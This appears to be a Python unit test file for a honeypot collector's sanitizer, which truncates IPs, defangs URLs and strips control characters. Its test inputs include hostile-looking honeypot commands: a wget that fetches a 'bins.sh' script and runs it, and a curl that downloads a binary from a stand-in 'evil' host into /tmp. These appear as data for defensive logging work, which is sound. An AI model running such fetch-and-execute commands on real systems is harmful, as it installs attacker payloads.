from honeypot_collector.sanitize import (
    clean_text,
    sanitize_command,
    sanitize_credential,
    truncate_ip,
)


def test_truncate_ipv4_to_24():
    assert truncate_ip("203.0.113.77") == "203.0.113.0/24"


def test_truncate_ipv6_to_48():
    assert truncate_ip("2001:db8:abcd:12::1") == "2001:db8:abcd::/48"


def test_truncate_invalid_returns_none():
    assert truncate_ip("not-an-ip") is None
    assert truncate_ip("999.1.1.1") is None


def test_command_ipv4_keeps_only_24():
    assert sanitize_command("ping -c1 198.51.100.23") == "ping -c1 198.51.100.x"


def test_command_url_with_ip_host_is_defanged_and_redacted():
    out = sanitize_command("wget http://203.0.113.47/bins.sh; sh bins.sh")
    assert out == "wget hxxp://203[.]0[.]113[.]x/bins.sh; sh bins.sh"
    assert "203.0.113.47" not in out


def test_command_url_with_domain_is_defanged():
    out = sanitize_command("curl -s https://cdn.evil.invalid/x86 -o /tmp/x")
    assert out == "curl -s hxxps://cdn[.]evil[.]invalid/x86 -o /tmp/x"


def test_command_ipv6_removed():
    assert sanitize_command("ssh root@2001:db8::42") == "ssh root@[ipv6]"


def test_command_time_like_strings_untouched():
    assert sanitize_command("date -s 12:30:45") == "date -s 12:30:45"


def test_version_strings_with_more_than_four_parts_untouched():
    assert sanitize_command("apt install foo=1.2.3.4.5") == "apt install foo=1.2.3.4.5"


def test_out_of_range_octets_untouched():
    assert sanitize_command("echo 300.1.1.1") == "echo 300.1.1.1"


def test_control_and_bidi_characters_stripped():
    out = sanitize_command("echo \x1b[31mred\x07 \u202egnp.exe")
    assert "\x1b" not in out and "\x07" not in out and "\u202e" not in out


def test_whitespace_collapsed():
    assert sanitize_command("  uname\t\t-a \n ") == "uname -a"


def test_long_command_truncated_with_ellipsis():
    out = sanitize_command("echo " + "A" * 500, max_len=40)
    assert len(out) == 40 and out.endswith("\u2026")


def test_credentials_empty_and_ip():
    assert sanitize_credential("") == "(empty)"
    assert sanitize_credential("10.20.30.40") == "10.20.30.x"


def test_clean_text_accepts_non_strings():
    assert clean_text(12345, max_len=10) == "12345"
